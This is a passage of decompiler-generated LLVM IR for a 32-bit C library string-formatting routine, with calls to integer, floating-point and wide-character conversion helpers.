  store i32 %v0_804e93d, i32* %v3_804e93d, align 4
  %v0_804e93e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e93e = add i32 %v0_804e923, -16
  %v3_804e93e = inttoptr i32 %v2_804e93e to i32*
  store i32 %v0_804e93e, i32* %v3_804e93e, align 4
  %v0_804e93f = call i32 @_load_inttype()
  %v0_804e944 = load i32, i32* @ebx, align 4
  %v1_804e944 = load i32, i32* @esp, align 4
  %v2_804e944 = inttoptr i32 %v1_804e944 to i32*
  store i32 %v0_804e944, i32* %v2_804e944, align 4
  %v0_804e947 = load i32, i32* @esi, align 4
  %v1_804e947 = load i32, i32* @esp, align 4
  %v2_804e947 = add i32 %v1_804e947, -4
  %v3_804e947 = inttoptr i32 %v2_804e947 to i32*
  store i32 %v0_804e947, i32* %v3_804e947, align 4
  %v0_804e948 = load i32, i32* @edx, align 4
  %v2_804e948 = add i32 %v1_804e947, -8
  %v3_804e948 = inttoptr i32 %v2_804e948 to i32*
  store i32 %v0_804e948, i32* %v3_804e948, align 4
  %v2_804e949 = add i32 %v1_804e947, -12
  %v3_804e949 = inttoptr i32 %v2_804e949 to i32*
  store i32 %v0_804e93f, i32* %v3_804e949, align 4
  %v1_804e94a = add i32 %v1_804e947, 347
  store i32 %v1_804e94a, i32* %eax.global-to-local, align 4
  %v2_804e951 = add i32 %v1_804e947, -16
  %v3_804e951 = inttoptr i32 %v2_804e951 to i32*
  store i32 %v1_804e94a, i32* %v3_804e951, align 4
  %v0_804e952 = load i32, i32* %stack_var_-364, align 4
  %v5_804e952 = inttoptr i32 %v0_804e952 to i8*
  %v6_804e952 = call i32 @_uintmaxtostr(i8* %v5_804e952, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e952, i32* %eax.global-to-local, align 4
  %v0_804e957 = load i32, i32* @esp, align 4
  %v1_804e957 = add i32 %v0_804e957, 32
  %v1_804e95a = add i32 %v0_804e957, 80
  %v2_804e95a = inttoptr i32 %v1_804e95a to i32*
  %v3_804e95a = load i32, i32* %v2_804e95a, align 4
  %v4_804e95a = add i32 %v3_804e95a, -5
  %v8_804e95a = icmp ult i32 %v3_804e95a, 5
  %v12_804e95a = icmp eq i32 %v4_804e95a, 0
  %v13_804e95a = icmp slt i32 %v4_804e95a, 0
  store i1 %v13_804e95a, i1* %sf.global-to-local, align 1
  store i32 %v6_804e952, i32* @edi, align 4
  %v2_804e961 = or i1 %v8_804e95a, %v12_804e95a
  br i1 %v2_804e961, label %dec_label_pc_804e98b, label %dec_label_pc_804e963

dec_label_pc_804e963:                             ; preds = %dec_label_pc_804e93b
  %v7_804e952 = inttoptr i32 %v6_804e952 to i8*
  %v3_804e963 = load i8, i8* %v7_804e952, align 1
  %v4_804e963 = add i8 %v3_804e963, -45
  %v12_804e963 = icmp eq i8 %v4_804e963, 0
  %v13_804e963 = icmp slt i8 %v4_804e963, 0
  store i1 %v13_804e963, i1* %sf.global-to-local, align 1
  %v1_804e966 = icmp eq i1 %v12_804e963, false
  %v1_804e975 = add i32 %v0_804e957, 64
  %v2_804e975 = inttoptr i32 %v1_804e975 to i32*
  %v3_804e975 = load i32, i32* %v2_804e975, align 4
  br i1 %v1_804e966, label %dec_label_pc_804e975, label %dec_label_pc_804e968

dec_label_pc_804e968:                             ; preds = %dec_label_pc_804e963
  %v4_804e968 = or i32 %v3_804e975, 2
  store i32 %v4_804e968, i32* %v2_804e975, align 4
  %v0_804e96d = load i32, i32* @edi, align 4
  %v1_804e96d = add i32 %v0_804e96d, 1
  %v9_804e96d = icmp slt i32 %v1_804e96d, 0
  store i1 %v9_804e96d, i1* %sf.global-to-local, align 1
  store i32 %v1_804e96d, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e98b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e98b

dec_label_pc_804e975:                             ; preds = %dec_label_pc_804e963
  store i32 %v3_804e975, i32* %eax.global-to-local, align 4
  %v2_804e979 = and i32 %v3_804e975, 2
  %v3_804e979 = icmp eq i32 %v2_804e979, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804e979, label %dec_label_pc_804e981, label %dec_label_pc_804e97d

dec_label_pc_804e97d:                             ; preds = %dec_label_pc_804e975
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e98b

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e975
  %v2_804e981 = urem i32 %v3_804e975, 2
  %v3_804e981 = icmp eq i32 %v2_804e981, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804e988 = icmp eq i1 %v3_804e981, false
  %v2_804e988 = load i32, i32* @ebp, align 4
  %v4_804e988 = select i1 %v1_804e988, i32 4, i32 %v2_804e988
  store i32 %v4_804e988, i32* @ebp, align 4
  br label %dec_label_pc_804e98b

dec_label_pc_804e98b:                             ; preds = %dec_label_pc_804e93b, %dec_label_pc_804e97d, %dec_label_pc_804e968, %dec_label_pc_804e981
  %v0_804e9dd = phi i32 [ %v6_804e952, %dec_label_pc_804e93b ], [ %v6_804e952, %dec_label_pc_804e97d ], [ %v1_804e96d, %dec_label_pc_804e968 ], [ %v6_804e952, %dec_label_pc_804e981 ]
  %v0_804e9ed = phi i32 [ %v1_804e957, %dec_label_pc_804e93b ], [ %v1_804e957, %dec_label_pc_804e97d ], [ %v0_804e98b.pre, %dec_label_pc_804e968 ], [ %v1_804e957, %dec_label_pc_804e981 ]
  %v1_804e98b = add i32 %v0_804e9ed, 20
  %v2_804e98b = inttoptr i32 %v1_804e98b to i32*
  %v3_804e98b = load i32, i32* %v2_804e98b, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804e98f = sub i32 204, %v0_804e9dd
  %v2_804e99b = add i32 %v1_804e98f, %v0_804e9ed
  %v1_804e99d = add i32 %v2_804e99b, 127
  store i32 %v1_804e99d, i32* @esi, align 4
  %v2_804e9a0 = icmp slt i32 %v3_804e98b, 0
  store i1 %v2_804e9a0, i1* %sf.global-to-local, align 1
  %v3_804e9a2 = select i1 %v2_804e9a0, i32 1, i32 %v3_804e98b
  store i32 %v3_804e9a2, i32* %ecx.global-to-local, align 4
  %v1_804e9a5 = add i32 %v0_804e9ed, 32
  %v2_804e9a5 = inttoptr i32 %v1_804e9a5 to i8*
  %v3_804e9a5 = load i8, i8* %v2_804e9a5, align 1
  %v4_804e9a5 = and i8 %v3_804e9a5, 16
  %v5_804e9a5 = icmp eq i8 %v4_804e9a5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804e9a5, label %dec_label_pc_804e9dd, label %dec_label_pc_804e9ac

dec_label_pc_804e9ac:                             ; preds = %dec_label_pc_804e98b
  %v1_804e9ac = add i32 %v0_804e9ed, 48
  %v2_804e9ac = inttoptr i32 %v1_804e9ac to i32*
  %v3_804e9ac = load i32, i32* %v2_804e9ac, align 4
  store i32 %v3_804e9ac, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v3_804e9ac, 3
  %v3_804e9b5 = load i32, i32* @ebp, align 4
  %v5_804e9b5 = select i1 %tmp70, i32 6, i32 %v3_804e9b5
  store i32 %v5_804e9b5, i32* @ebp, align 4
  %v1_804e9b8 = add i32 %v3_804e9ac, -3
  %v9_804e9b8 = icmp eq i32 %v1_804e9b8, 0
  %v10_804e9b8 = icmp slt i32 %v1_804e9b8, 0
  store i1 %v10_804e9b8, i1* %sf.global-to-local, align 1
  %v1_804e9bb = icmp eq i1 %v9_804e9b8, false
  br i1 %v1_804e9bb, label %dec_label_pc_804e9c4, label %dec_label_pc_804e9bd

dec_label_pc_804e9bd:                             ; preds = %dec_label_pc_804e9ac
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e9dd

dec_label_pc_804e9c4:                             ; preds = %dec_label_pc_804e9ac
  %v1_804e9c4 = add i32 %v3_804e9ac, -4
  %v9_804e9c4 = icmp eq i32 %v1_804e9c4, 0
  %v10_804e9c4 = icmp slt i32 %v1_804e9c4, 0
  store i1 %v10_804e9c4, i1* %sf.global-to-local, align 1
  %v1_804e9c7 = icmp eq i1 %v9_804e9c4, false
  br i1 %v1_804e9c7, label %dec_label_pc_804e9dd, label %dec_label_pc_804e9c9

dec_label_pc_804e9c9:                             ; preds = %dec_label_pc_804e9c4
  %v2_804e9c9 = sub i32 %v3_804e9a2, %v1_804e99d
  %v7_804e9c9 = icmp ult i32 %v3_804e9a2, %v1_804e99d
  %v12_804e9c9 = icmp eq i32 %v2_804e9c9, 0
  %v13_804e9c9 = icmp slt i32 %v2_804e9c9, 0
  store i1 %v13_804e9c9, i1* %sf.global-to-local, align 1
  %v2_804e9cb = or i1 %v7_804e9c9, %v12_804e9c9
  br i1 %v2_804e9cb, label %dec_label_pc_804e9cd, label %dec_label_pc_804e9dd

dec_label_pc_804e9cd:                             ; preds = %dec_label_pc_804e9c9
  %v1_804e9cd = inttoptr i32 %v0_804e9dd to i8*
  %v2_804e9cd = load i8, i8* %v1_804e9cd, align 1
  %v3_804e9cd = add i8 %v2_804e9cd, -48
  %v8_804e9cd = icmp eq i8 %v3_804e9cd, 0
  %v9_804e9cd = icmp slt i8 %v3_804e9cd, 0
  store i1 %v9_804e9cd, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804e9cd, label %dec_label_pc_804e9dd, label %dec_label_pc_804e9d7

dec_label_pc_804e9d7:                             ; preds = %dec_label_pc_804e9cd
  %v1_804e9d7 = add i32 %v2_804e99b, 128
  store i32 %v1_804e9d7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e9dd

dec_label_pc_804e9dd:                             ; preds = %dec_label_pc_804e9c9, %dec_label_pc_804e9cd, %dec_label_pc_804e9c4, %dec_label_pc_804e98b, %dec_label_pc_804e9bd, %dec_label_pc_804e9d7
  %v0_804ea16 = phi i32 [ %v3_804e9a2, %dec_label_pc_804e9c9 ], [ 1, %dec_label_pc_804e9cd ], [ %v3_804e9a2, %dec_label_pc_804e9c4 ], [ %v3_804e9a2, %dec_label_pc_804e98b ], [ %v3_804e9a2, %dec_label_pc_804e9bd ], [ %v1_804e9d7, %dec_label_pc_804e9d7 ]
  %v1_804e9dd = inttoptr i32 %v0_804e9dd to i8*
  %v2_804e9dd = load i8, i8* %v1_804e9dd, align 1
  %v3_804e9dd = add i8 %v2_804e9dd, -48
  %v8_804e9dd = icmp eq i8 %v3_804e9dd, 0
  %v9_804e9dd = icmp slt i8 %v3_804e9dd, 0
  store i1 %v9_804e9dd, i1* %sf.global-to-local, align 1
  %v1_804e9e0 = icmp eq i1 %v8_804e9dd, false
  br i1 %v1_804e9e0, label %dec_label_pc_804ea0e, label %dec_label_pc_804e9e2

dec_label_pc_804e9e2:                             ; preds = %dec_label_pc_804e9dd
  %v0_804e9e2 = load i32, i32* @ebp, align 4
  %v1_804e9e2 = add i32 %v0_804e9e2, -6
  %v6_804e9e2 = sub i32 5, %v0_804e9e2
  %v7_804e9e2 = and i32 %v6_804e9e2, %v0_804e9e2
  %v8_804e9e2 = icmp slt i32 %v7_804e9e2, 0
  %v10_804e9e2 = icmp slt i32 %v1_804e9e2, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804e9ea = icmp eq i1 %v10_804e9e2, %v8_804e9e2
  %v5_804e9ea = select i1 %v2_804e9ea, i32 11, i32 %v0_804e9e2
  store i32 %v5_804e9ea, i32* @ebp, align 4
  %v1_804e9ed = add i32 %v0_804e9ed, 48
  %v2_804e9ed = inttoptr i32 %v1_804e9ed to i32*
  %v3_804e9ed = load i32, i32* %v2_804e9ed, align 4
  %v4_804e9ed = add i32 %v3_804e9ed, -1
  %v12_804e9ed = icmp eq i32 %v4_804e9ed, 0
  %v13_804e9ed = icmp slt i32 %v4_804e9ed, 0
  store i1 %v13_804e9ed, i1* %sf.global-to-local, align 1
  %v1_804e9f2 = icmp eq i1 %v12_804e9ed, false
  br i1 %v1_804e9f2, label %dec_label_pc_804ea03, label %dec_label_pc_804e9f4

dec_label_pc_804e9f4:                             ; preds = %dec_label_pc_804e9e2
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8057378.165 to i32), i32* @edi, align 4
  br label %dec_label_pc_804eb8d

dec_label_pc_804ea03:                             ; preds = %dec_label_pc_804e9e2
  %v1_804ea03 = icmp eq i32 %v0_804ea16, 0
  %v2_804ea03 = icmp slt i32 %v0_804ea16, 0
  store i1 %v2_804ea03, i1* %sf.global-to-local, align 1
  %v1_804ea05 = icmp eq i1 %v1_804ea03, false
  br i1 %v1_804ea05, label %dec_label_pc_804ea0e, label %dec_label_pc_804ea07

dec_label_pc_804ea07:                             ; preds = %dec_label_pc_804ea03
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804eb8d

dec_label_pc_804ea0e:                             ; preds = %dec_label_pc_804ea03, %dec_label_pc_804e9dd
  %v2_804ea0e = sub i32 %v0_804ea16, %v1_804e99d
  %v7_804ea0e = icmp ult i32 %v0_804ea16, %v1_804e99d
  %v12_804ea0e = icmp eq i32 %v2_804ea0e, 0
  %v13_804ea0e = icmp slt i32 %v2_804ea0e, 0
  store i1 %v13_804ea0e, i1* %sf.global-to-local, align 1
  %v2_804ea10 = or i1 %v7_804ea0e, %v12_804ea0e
  br i1 %v2_804ea10, label %dec_label_pc_804eb8d, label %dec_label_pc_804ea16

dec_label_pc_804ea16:                             ; preds = %dec_label_pc_804ea0e
  store i1 %v13_804ea0e, i1* %sf.global-to-local, align 1
  store i32 %v2_804ea0e, i32* @ebx, align 4
  br label %dec_label_pc_804eba7

dec_label_pc_804ea1f:                             ; preds = %dec_label_pc_804e8b2
  %v1_804ea1f = add i32 %v3_804e884, -15
  %v5_804ea1f = icmp ult i32 %v3_804e884, 15
  %v9_804ea1f = icmp eq i32 %v1_804ea1f, 0
  %v10_804ea1f = icmp slt i32 %v1_804ea1f, 0
  store i1 %v10_804ea1f, i1* %sf.global-to-local, align 1
  %v2_804ea22 = or i1 %v5_804ea1f, %v9_804ea1f
  br i1 %v2_804ea22, label %dec_label_pc_804ea24, label %dec_label_pc_804ea69

dec_label_pc_804ea24:                             ; preds = %dec_label_pc_804ea1f
  %v1_804ea24 = add i32 %v0_804e884.lcssa, 33
  %v2_804ea24 = inttoptr i32 %v1_804ea24 to i8*
  %v3_804ea24 = load i8, i8* %v2_804ea24, align 1
  %v4_804ea24 = and i8 %v3_804ea24, 8
  %v5_804ea24 = icmp eq i8 %v4_804ea24, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804ea29 = add i32 %v0_804e884.lcssa, 344
  %v2_804ea29 = inttoptr i32 %v1_804ea29 to i32*
  %v3_804ea29 = load i32, i32* %v2_804ea29, align 4
  store i32 %v3_804ea29, i32* %edx.global-to-local, align 4
  br i1 %v5_804ea24, label %dec_label_pc_804ea36, label %dec_label_pc_804ea32

dec_label_pc_804ea32:                             ; preds = %dec_label_pc_804ea24
  %v1_804ea32 = inttoptr i32 %v3_804ea29 to x86_fp80*
  %v2_804ea32 = load x86_fp80, x86_fp80* %v1_804ea32, align 4
  br label %dec_label_pc_804ea38

dec_label_pc_804ea36:                             ; preds = %dec_label_pc_804ea24
  %v1_804ea36 = inttoptr i32 %v3_804ea29 to double*
  %v2_804ea36 = load double, double* %v1_804ea36, align 4
  %v3_804ea36 = fpext double %v2_804ea36 to x86_fp80
  br label %dec_label_pc_804ea38

dec_label_pc_804ea38:                             ; preds = %dec_label_pc_804ea32, %dec_label_pc_804ea36
  %storemerge5 = phi x86_fp80 [ %v2_804ea32, %dec_label_pc_804ea32 ], [ %v3_804ea36, %dec_label_pc_804ea36 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_804ea38 = load i32, i32* @esi, align 4
  %v2_804ea38 = add i32 %v0_804e884.lcssa, -4
  %v3_804ea38 = inttoptr i32 %v2_804ea38 to i32*
  store i32 %v0_804ea38, i32* %v3_804ea38, align 4
  %v0_804ea39 = load i32, i32* @esi, align 4
  %v2_804ea39 = add i32 %v0_804e884.lcssa, -8
  %v3_804ea39 = inttoptr i32 %v2_804ea39 to i32*
  store i32 %v0_804ea39, i32* %v3_804ea39, align 4
  %v1_804ea3a = add i32 %v0_804e884.lcssa, -12
  %v2_804ea3a = inttoptr i32 %v1_804ea3a to i32*
  store i32 134539002, i32* %v2_804ea3a, align 4
  %v1_804ea3f = add i32 %v0_804e884.lcssa, 20
  store i32 %v1_804ea3f, i32* %eax.global-to-local, align 4
  %v2_804ea43 = add i32 %v0_804e884.lcssa, -16
  %v3_804ea43 = inttoptr i32 %v2_804ea43 to i32*
  store i32 %v1_804ea3f, i32* %v3_804ea43, align 4
  %v1_804ea44 = add i32 %v0_804e884.lcssa, -28
  %v10_804ea44 = icmp slt i32 %v1_804ea44, 0
  store i1 %v10_804ea44, i1* %sf.global-to-local, align 1
  %v1_804ea47 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804ea47 = inttoptr i32 %v1_804ea44 to x86_fp80*
  store x86_fp80 %v1_804ea47, x86_fp80* %v3_804ea47, align 4
  %v1_804ea4a = add i32 %v0_804e884.lcssa, 368
  %v2_804ea4a = inttoptr i32 %v1_804ea4a to i32*
  %v3_804ea4a = load i32, i32* %v2_804ea4a, align 4
  %v5_804ea4a = add i32 %v0_804e884.lcssa, -32
  %v6_804ea4a = inttoptr i32 %v5_804ea4a to i32*
  store i32 %v3_804ea4a, i32* %v6_804ea4a, align 4
  %v0_804ea51 = call i32 @_fpmaxtostr()
  store i32 %v0_804ea51, i32* %eax.global-to-local, align 4
  %v0_804ea56 = load i32, i32* @esp, align 4
  %v1_804ea56 = add i32 %v0_804ea56, 32
  %v2_804ea59 = icmp slt i32 %v0_804ea51, 0
  store i1 %v2_804ea59, i1* %sf.global-to-local, align 1
  br i1 %v2_804ea59, label %dec_label_pc_804ed07, label %dec_label_pc_804ea61

dec_label_pc_804ea61:                             ; preds = %dec_label_pc_804ea38
  %v1_804ea61 = inttoptr i32 %v1_804ea56 to i32*
  %v2_804ea61 = load i32, i32* %v1_804ea61, align 4
  %v4_804ea61 = add i32 %v2_804ea61, %v0_804ea51
  %v15_804ea61 = icmp slt i32 %v4_804ea61, 0
  store i1 %v15_804ea61, i1* %sf.global-to-local, align 1
  store i32 %v4_804ea61, i32* %v1_804ea61, align 4
  %v0_804ecf4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecf4

dec_label_pc_804ea69:                             ; preds = %dec_label_pc_804ea1f
  %v1_804ea69 = add i32 %v3_804e884, -17
  %v5_804ea69 = icmp ult i32 %v3_804e884, 17
  %v9_804ea69 = icmp eq i32 %v1_804ea69, 0
  %v10_804ea69 = icmp slt i32 %v1_804ea69, 0
  store i1 %v10_804ea69, i1* %sf.global-to-local, align 1
  %v2_804ea6c = or i1 %v5_804ea69, %v9_804ea69
  br i1 %v2_804ea6c, label %dec_label_pc_804ea72, label %dec_label_pc_804eb06

dec_label_pc_804ea72:                             ; preds = %dec_label_pc_804ea69
  %v1_804ea72 = add i32 %v0_804e884.lcssa, 332
  %v2_804ea72 = inttoptr i32 %v1_804ea72 to i32*
  store i32 0, i32* %v2_804ea72, align 4
  %v0_804ea7d = load i32, i32* @esp, align 4
  %v1_804ea7d = add i32 %v0_804ea7d, 344
  %v2_804ea7d = inttoptr i32 %v1_804ea7d to i32*
  %v3_804ea7d = load i32, i32* %v2_804ea7d, align 4
  store i32 %v3_804ea7d, i32* %edx.global-to-local, align 4
  %v1_804ea84 = icmp eq i1 %v9_804ea69, false
  br i1 %v1_804ea84, label %dec_label_pc_804ead6, label %dec_label_pc_804ea86

dec_label_pc_804ea86:                             ; preds = %dec_label_pc_804ea72
  %v1_804ea86 = inttoptr i32 %v3_804ea7d to i32*
  %v2_804ea86 = load i32, i32* %v1_804ea86, align 4
  store i32 %v2_804ea86, i32* %eax.global-to-local, align 4
  %v1_804ea88 = icmp eq i32 %v2_804ea86, 0
  %v2_804ea88 = icmp slt i32 %v2_804ea86, 0
  store i1 %v2_804ea88, i1* %sf.global-to-local, align 1
  %v2_804ea8a = add i32 %v0_804ea7d, 340
  %v3_804ea8a = inttoptr i32 %v2_804ea8a to i32*
  store i32 %v2_804ea86, i32* %v3_804ea8a, align 4
  br i1 %v1_804ea88, label %dec_label_pc_804eb91, label %dec_label_pc_804ea97

dec_label_pc_804ea97:                             ; preds = %dec_label_pc_804ea86
  %v0_804ea97 = load i32, i32* @esp, align 4
  %v1_804ea97 = add i32 %v0_804ea97, 20
  %v2_804ea97 = inttoptr i32 %v1_804ea97 to i32*
  %v3_804ea97 = load i32, i32* %v2_804ea97, align 4
  %v1_804ea9e = add i32 %v0_804ea97, 340
  store i32 %v1_804ea9e, i32* %ecx.global-to-local, align 4
  %v2_804eaa5 = icmp slt i32 %v3_804ea97, 0
  store i1 %v2_804eaa5, i1* %sf.global-to-local, align 1
  %v1_804eaa7 = icmp eq i1 %v2_804eaa5, false
  %v4_804eaa7 = select i1 %v1_804eaa7, i32 %v3_804ea97, i32 -1
  store i32 %v4_804eaa7, i32* %edx.global-to-local, align 4
  %v1_804eaaa = add i32 %v0_804ea97, 332
  store i32 %v1_804eaaa, i32* %eax.global-to-local, align 4
  %v2_804eab1 = add i32 %v0_804ea97, -4
  %v3_804eab1 = inttoptr i32 %v2_804eab1 to i32*
  store i32 %v1_804eaaa, i32* %v3_804eab1, align 4
  %v0_804eab2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eab2 = add i32 %v0_804ea97, -8
  %v3_804eab2 = inttoptr i32 %v2_804eab2 to i32*
  store i32 %v0_804eab2, i32* %v3_804eab2, align 4
  %v0_804eab3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804eab3 = add i32 %v0_804ea97, -12
  %v3_804eab3 = inttoptr i32 %v2_804eab3 to i32*
  store i32 %v0_804eab3, i32* %v3_804eab3, align 4
  %v0_804eab4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804eab4 = add i32 %v0_804ea97, -16
  %v3_804eab4 = inttoptr i32 %v2_804eab4 to i32*
  store i32 %v0_804eab4, i32* %v3_804eab4, align 4
  %v0_804eab5 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804eab5, i32* %eax.global-to-local, align 4
  %v0_804eaba = load i32, i32* @esp, align 4
  %v1_804eaba = add i32 %v0_804eaba, 16
  %v1_804eabd = add i32 %v0_804eab5, 1
  %v10_804eabd = icmp eq i32 %v1_804eabd, 0
  %v11_804eabd = icmp slt i32 %v1_804eabd, 0
  store i1 %v11_804eabd, i1* %sf.global-to-local, align 1
  store i32 %v0_804eab5, i32* @esi, align 4
  br i1 %v10_804eabd, label %dec_label_pc_804ed07, label %dec_label_pc_804eac8

dec_label_pc_804eac8:                             ; preds = %dec_label_pc_804ea97
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804ead6:                             ; preds = %dec_label_pc_804ea72
  %v0_804ead6 = load i32, i32* @ebx, align 4
  %v2_804ead6 = add i32 %v0_804ea7d, -4
  %v3_804ead6 = inttoptr i32 %v2_804ead6 to i32*
  store i32 %v0_804ead6, i32* %v3_804ead6, align 4
  %v1_804ead7 = add i32 %v0_804ea7d, 332
  store i32 %v1_804ead7, i32* %eax.global-to-local, align 4
  %v2_804eade = add i32 %v0_804ea7d, -8
  %v3_804eade = inttoptr i32 %v2_804eade to i32*
  store i32 %v1_804ead7, i32* %v3_804eade, align 4
  %v0_804eadf = load i32, i32* %edx.global-to-local, align 4
  %v1_804eadf = inttoptr i32 %v0_804eadf to i32*
  %v2_804eadf = load i32, i32* %v1_804eadf, align 4
  %v4_804eadf = add i32 %v0_804ea7d, -12
  %v5_804eadf = inttoptr i32 %v4_804eadf to i32*
  store i32 %v2_804eadf, i32* %v5_804eadf, align 4
  %v1_804eae1 = add i32 %v0_804ea7d, 204
  store i32 %v1_804eae1, i32* @edi, align 4
  %v2_804eae8 = add i32 %v0_804ea7d, -16
  %v3_804eae8 = inttoptr i32 %v2_804eae8 to i32*
  store i32 %v1_804eae1, i32* %v3_804eae8, align 4
  %v0_804eae9 = call i32 @__GI_wcrtomb()
  store i32 %v0_804eae9, i32* %eax.global-to-local, align 4
  %v0_804eaee = load i32, i32* @esp, align 4
  %v1_804eaee = add i32 %v0_804eaee, 16
  %v1_804eaf1 = add i32 %v0_804eae9, 1
  %v10_804eaf1 = icmp eq i32 %v1_804eaf1, 0
  %v11_804eaf1 = icmp slt i32 %v1_804eaf1, 0
  store i1 %v11_804eaf1, i1* %sf.global-to-local, align 1
  store i32 %v0_804eae9, i32* @esi, align 4
  br i1 %v10_804eaf1, label %dec_label_pc_804ed07, label %dec_label_pc_804eafc

dec_label_pc_804eafc:                             ; preds = %dec_label_pc_804ead6
  %v2_804eafc = add i32 %v0_804eae9, 220
  %v3_804eafc = add i32 %v2_804eafc, %v0_804eaee
  %v4_804eafc = inttoptr i32 %v3_804eafc to i8*
  store i8 0, i8* %v4_804eafc, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804eb06:                             ; preds = %dec_label_pc_804ea69
  %v1_804eb06 = add i32 %v3_804e884, -19
  %v5_804eb06 = icmp ult i32 %v3_804e884, 19
  %v9_804eb06 = icmp eq i32 %v1_804eb06, 0
  %v10_804eb06 = icmp slt i32 %v1_804eb06, 0
  store i1 %v10_804eb06, i1* %sf.global-to-local, align 1
  %v2_804eb09 = or i1 %v5_804eb06, %v9_804eb06
  br i1 %v2_804eb09, label %dec_label_pc_804eb0b, label %dec_label_pc_804eb63

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804eb06
  %v1_804eb0b = add i32 %v0_804e884.lcssa, 344
  %v2_804eb0b = inttoptr i32 %v1_804eb0b to i32*
  %v3_804eb0b = load i32, i32* %v2_804eb0b, align 4
  store i32 %v3_804eb0b, i32* %edx.global-to-local, align 4
  %v1_804eb12 = icmp eq i1 %v9_804eb06, false
  %v1_804eb3d = inttoptr i32 %v3_804eb0b to i32*
  %v2_804eb3d = load i32, i32* %v1_804eb3d, align 4
  br i1 %v1_804eb12, label %dec_label_pc_804eb3d, label %dec_label_pc_804eb14

dec_label_pc_804eb14:                             ; preds = %dec_label_pc_804eb0b
  store i32 %v2_804eb3d, i32* @edi, align 4
  %v1_804eb16 = icmp eq i32 %v2_804eb3d, 0
  %v2_804eb16 = icmp slt i32 %v2_804eb3d, 0
  store i1 %v2_804eb16, i1* %sf.global-to-local, align 1
  br i1 %v1_804eb16, label %dec_label_pc_804eb91, label %dec_label_pc_804eb1a

dec_label_pc_804eb1a:                             ; preds = %dec_label_pc_804eb14, %dec_label_pc_804eb6c
  %v1_804eb21 = phi i32 [ %v0_804e884.lcssa, %dec_label_pc_804eb14 ], [ %v1_804eb86, %dec_label_pc_804eb6c ]
  %v1_804eb1a = add i32 %v1_804eb21, 20
  %v2_804eb1a = inttoptr i32 %v1_804eb1a to i32*
  %v3_804eb1a = load i32, i32* %v2_804eb1a, align 4
  store i32 %v3_804eb1a, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804eb21 = add i32 %v1_804eb21, -4
  %v3_804eb21 = inttoptr i32 %v2_804eb21 to i32*
  store i32 %v3_804e884, i32* %v3_804eb21, align 4
  %v2_804eb22 = add i32 %v1_804eb21, -8
  %v3_804eb22 = inttoptr i32 %v2_804eb22 to i32*
  store i32 %v3_804e884, i32* %v3_804eb22, align 4
  %v2_804eb23 = icmp slt i32 %v3_804eb1a, 0
  store i1 %v2_804eb23, i1* %sf.global-to-local, align 1
  %v1_804eb25 = icmp eq i1 %v2_804eb23, false
  %v2_804eb25 = load i32, i32* %eax.global-to-local, align 4
  %v4_804eb25 = select i1 %v1_804eb25, i32 %v3_804eb1a, i32 %v2_804eb25
  store i32 %v4_804eb25, i32* %eax.global-to-local, align 4
  %v2_804eb28 = add i32 %v1_804eb21, -12
  %v3_804eb28 = inttoptr i32 %v2_804eb28 to i32*
  store i32 %v4_804eb25, i32* %v3_804eb28, align 4
  %v0_804eb29 = load i32, i32* @edi, align 4
  %v2_804eb29 = add i32 %v1_804eb21, -16
  %v3_804eb29 = inttoptr i32 %v2_804eb29 to i32*
  store i32 %v0_804eb29, i32* %v3_804eb29, align 4
  %v0_804eb2a = call i32 @strnlen()
  store i32 %v0_804eb2a, i32* %eax.global-to-local, align 4
  %v0_804eb2f = load i32, i32* @esp, align 4
  %v1_804eb2f = add i32 %v0_804eb2f, 16
  %v7_804eb2f = icmp slt i32 %v1_804eb2f, 0
  store i1 %v7_804eb2f, i1* %sf.global-to-local, align 1
  store i32 %v0_804eb2a, i32* @esi, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804eb34:                             ; preds = %dec_label_pc_804eafc, %dec_label_pc_804eb1a
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804eb3d:                             ; preds = %dec_label_pc_804eb0b
  store i32 %v2_804eb3d, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804eb4b = add i32 %v0_804e884.lcssa, 204
